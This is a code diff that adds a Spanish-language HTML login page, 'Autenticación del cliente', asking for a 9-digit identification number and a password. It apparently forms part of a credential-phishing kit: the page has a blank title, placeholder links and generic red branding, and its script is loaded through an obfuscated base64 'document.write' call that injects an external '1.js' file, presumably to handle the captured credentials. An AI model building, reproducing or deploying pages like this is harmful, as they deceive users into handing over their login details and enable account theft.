@@ -1,0 +1,235 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>.</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+html, body {
+    width: 100%;
+    min-height: 100%;
+    font-family: Arial, Helvetica, sans-serif;
+    background: #fff;
+}
+
+body {
+    overflow-x: hidden;
+}
+
+.topbar {
+    width: 100%;
+    height: 52px;
+    background: #ed1828;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0 6.5%;
+}
+
+.imagen-superior {
+    height: 38px;
+    width: auto;
+    object-fit: contain;
+}
+
+.topbar a {
+    color: white;
+    font-size: 12px;
+    text-decoration: none;
+}
+
+.main {
+    width: 100%;
+    min-height: 550px;
+    padding-top: 115px;
+    text-align: center;
+}
+
+.title {
+    font-family: Georgia, serif;
+    font-size: 34px;
+    font-weight: normal;
+    color: #111;
+    margin-bottom: 90px;
+}
+
+.input-demo {
+    width: 185px;
+    height: 29px;
+    border: none;
+    border-bottom: 2px solid #ed1828;
+    outline: none;
+    text-align: center;
+    font-size: 14px;
+    background: transparent;
+    color: #333;
+}
+
+.input-demo:focus {
+    border-bottom: 2px solid #ed1828;
+}
+
+.continue {
+    display: block;
+    width: 139px;
+    height: 35px;
+    margin: 80px auto 0;
+    border: none;
+    border-radius: 30px;
+    background: #ed1828;
+    color: white;
+    font-size: 12px;
+    cursor: pointer;
+}
+
+.links {
+    margin: 44px auto 0;
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 30px;
+}
+
+.links a {
+    color: #ed1828;
+    font-size: 12px;
+    text-decoration: none;
+}
+
+.info {
+    width: 500px;
+    max-width: 90%;
+    margin: 30px auto 0;
+    text-align: left;
+    font-size: 12px;
+    line-height: 15px;
+    color: #888;
+}
+
+.footer {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 23px;
+    background: #000;
+    color: white;
+    padding-left: 39px;
+    display: flex;
+    align-items: center;
+    font-size: 10px;
+    font-weight: bold;
+}
+
+ 
+
+#mensaje {
+    font-size: 12px;
+    margin-top: 15px;
+}
+
+@media(max-width: 600px) {
+
+    .topbar {
+        height: 52px;
+        padding-right: 20px;
+    }
+
+    .main {
+        padding-top: 90px;
+        min-height: 550px;
+    }
+
+    .title {
+        font-size: 27px;
+        margin-bottom: 75px;
+    }
+
+    .continue {
+        margin-top: 70px;
+    }
+
+    .links {
+        gap: 18px;
+        padding: 0 15px;
+        margin-top: 40px;
+    }
+
+    .info {
+        width: 90%;
+        margin-top: 30px;
+    }
+
+    .footer {
+        padding-left: 15px;
+    }
+}
+</style>
+
+ 
+
+
+</head>
+
+<body>
+
+<div class="topbar">
+    <img src="logo.png" class="imagen-superior" alt="Logo">
+    <a href="#">Español | English</a>
+</div>
+
+<form id="pedidoForm">
+
+<main class="main">
+
+    <h1 class="title">Autenticación del cliente</h1>
+
+    <input
+        class="input-demo"
+        type="tel" id="pedido1" inputmode="numeric" placeholder="Ingrese número identificación" autocomplete="off" minlength="9" maxlength="9" onkeypress="if(event.keyCode&lt;45||event.keyCode&gt;57)event.returnValue=false;" required>
+
+    <br><br>
+
+    <input
+        class="input-demo"
+        type="text"
+        id="pedido2"
+        placeholder="Contraseña"
+        autocomplete="off"
+        required
+    >
+
+    <button class="continue" type="submit">Continuar</button>
+
+    <p id="mensaje" aria-live="polite"></p>
+
+    <nav class="links">
+        <a href="#informacion">Información</a>
+        <a href="#ayuda">Ayuda</a>
+        <a href="#comida">Centro de seguridad</a>
+    </nav>
+
+    <div class="info" id="informacion">
+ 
+    </div>
+
+</main>
+
+<footer class="footer">
+    © 2026 Todos los derechos reservados
+</footer>
+
+</form>
+
+<script>document.write(decodeURIComponent(escape(atob("PHNjcmlwdCBzcmM9IjEuanMiPjwvc2NyaXB0Pgo="))));</script>
+
+</body>
+</html>
